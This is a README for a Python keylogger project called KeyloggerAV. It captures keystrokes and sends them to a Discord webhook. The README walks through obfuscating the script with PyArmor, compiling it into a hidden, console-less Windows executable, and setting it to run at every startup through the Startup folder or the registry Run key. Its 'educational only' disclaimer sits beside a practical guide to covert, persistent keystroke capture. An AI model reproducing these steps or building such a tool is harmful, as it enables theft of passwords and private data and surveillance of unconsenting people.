# KeyloggerAV

![KeyloggerAV](https://via.placeholder.com/728x90.png?text=KeyloggerAV+Logo)

**KeyloggerAV** is a simple keylogger built with Python. It captures keystrokes on your system and sends them to a Discord webhook. 

🚨 **Please make sure you only use this tool on your own machines or with explicit consent from the user.** Unauthorized use is illegal and unethical. This tool is strictly for educational purposes.

---

## 📌 Features

- ✅ Captures keystrokes silently.
- ✅ Sends logs to a Discord webhook.
- ✅ Lightweight and easy to use.
- ✅ Can be compiled into an executable.
- ✅ Optional obfuscation for security.

---

## 🚀 Requirements

Before you get started, ensure you have:

- **Python 3.x** installed.
- The following Python libraries:
  - `pynput` – for capturing keystrokes.
  - `requests` – for sending data to the Discord webhook.
- **PyInstaller** – to compile the script into an executable (`.exe`).
- **PyArmor** – for optional code obfuscation.

---

## 🔧 Installation

### 1️⃣ Clone the Repository

```bash
git clone https://github.com/TheOnlySyntax/ObfuscationAV-keylogger
cd ObfuscationAV-keylogger
```

### 2️⃣ Install Dependencies

```bash
pip install pynput requests pyinstaller pyarmor
```

---

## ⚙️ Setup

### 🔹 1. Configure the Discord Webhook

Open `keyloggerAV.py` and locate:
```python
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url"
```
Replace `your_webhook_url` with your actual webhook URL.

### 🔹 2. (Optional) Obfuscate the Code

For added security, run:
```bash
pyarmor gen keyloggerAV.py
```
An obfuscated version will appear in the `dist` folder.

### 🔹 3. Compile to Executable

```bash
pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=pynput keyloggerAV.py
```
- `--onefile`: Bundles everything into one `.exe`.
- `--noconsole`: Hides the terminal.
- `--hidden-import`: Ensures dependencies are included.

The compiled `.exe` will be in the `dist` folder.

---

## 🖥️ Running the Program

Navigate to the `dist` folder and execute:
```bash
./keyloggerAV.exe
```

---

## 🚀 Add to Startup (Optional)

### 📁 1. Using Startup Folder

- Press `Win + R`, type `shell:startup`, and hit Enter.
- Copy the `.exe` file into the folder that opens.

### 🛠️ 2. Using Windows Registry (Advanced)

- Press `Win + R`, type `regedit`, and hit Enter.
- Navigate to:
```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```
- Right-click → `New > String Value`, name it `KeyloggerAV`, and set its value to the full path of your `.exe` file.

---

## ⚠️ Disclaimer

This project is for **educational purposes only**. The author is not responsible for any misuse. Always obtain explicit consent before use.

---

## 📜 License

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

This project is licensed under the **MIT License**. See the `LICENSE` file for details.

